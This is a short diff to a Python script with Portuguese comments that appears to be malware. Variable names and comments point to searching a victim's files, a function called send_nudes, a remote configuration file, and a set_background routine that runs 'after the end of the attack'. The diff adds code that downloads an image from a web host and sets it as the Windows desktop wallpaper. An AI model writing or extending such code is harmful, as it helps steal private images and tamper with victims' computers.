@@ -21,6 +21,7 @@ files_founded = 0
 
 #Link github onde esta hospedado o arquivo com as configuracoes da API
 server = 'URL COM ARQUIVO NUDES.CONF'
+background_url = "https://uploaddeimagens.com.br/images/000/619/131/full/fundo.jpg?1463080759"
 
 #Nome do arquivo de configuracao apos download
 config_file = 'nudes.conf'
@@ -124,6 +125,9 @@ def send_nudes():
 #Funcao responsavel por trocar o plano de fundo apos o final do ataque
 def set_background():
     import ctypes
+    r = requests.get(background_url)
+    with open('fundo.jpg','wb') as f:
+        f.write(r.content)
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "fundo.jpg" , 0)
 
